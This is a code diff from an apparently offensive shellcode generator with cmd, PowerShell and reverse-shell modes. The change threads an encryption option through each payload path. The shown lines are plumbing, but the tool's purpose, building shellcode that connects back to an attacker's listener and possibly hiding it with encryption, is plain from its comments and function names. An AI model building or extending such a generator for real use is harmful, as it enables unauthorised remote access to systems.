@@ -30,12 +30,8 @@ def main():
     if args.payload == "cmd":
         if not args.command:
             parser.error( "The --command argument is required when mode is 'cmd' or 'ps'." )
-
-        if not args.enc:
-            cmd( args.command, None)
         
-        else:
-            cmd( args.command, args.enc )
+        cmd( args.command, args.enc )
     
     #
     # FUNCTION TO HANDLE PS COMMAND EXECUTION
@@ -44,7 +40,7 @@ def main():
         if not args.command:
             parser.error( "The --comand argument is requried when mode is 'cmd' or 'ps'." )
         
-        ps( args.command )
+        ps( args.command, args.enc )
     
     #
     # FUNCTION TO HANDLE REVERSE SHELL
@@ -53,7 +49,7 @@ def main():
         if not args.host or not args.port:
             parser.error( "A --host and --port argument is required when mode is 'rs'." )
         
-        rev_shell( args.host, args.port )
+        rev_shell( args.host, args.port, args.enc )
 
 
 
@@ -123,7 +119,7 @@ def cmd( command, encryption_type ):
 # 
 # HANDLES USER COMMAND INPUT AND GENERATES THE 
 # SHELLCODE TO EXECUTE THE COMMAND IN POWERSHELL
-def ps( command ):
+def ps( command, encryption_type ):
     print( f"[+] Generating shellcode to execute: {command} in powershell" )
     
     #
@@ -168,7 +164,7 @@ def ps( command ):
     #
     # EXTRACT BYTES FROM SHELLCODE
     #
-    extract_shellcode()
+    extract_shellcode( encryption_type )
 
 
 
@@ -178,7 +174,7 @@ def ps( command ):
 # HANDLES USER ADDRESS AND PORT AND GENERATES THE 
 # SHELLCODE TO CONNECT TO ATTACKER'S LISTENER
 #
-def rev_shell( in_address, in_port ):
+def rev_shell( in_address, in_port, encryption_type ):
     print( f"[+] Generating shellcode to connect to attacker listener on: {in_address}:{in_port}" )
     #
     # MAKE THE DESIRED COMMAND INTO STACK STRING FORMAT
@@ -227,7 +223,7 @@ def rev_shell( in_address, in_port ):
     #
     # EXTRACT BYTES FROM SHELLCODE
     #
-    extract_shellcode()    
+    extract_shellcode( encryption_type )    
 
 
 
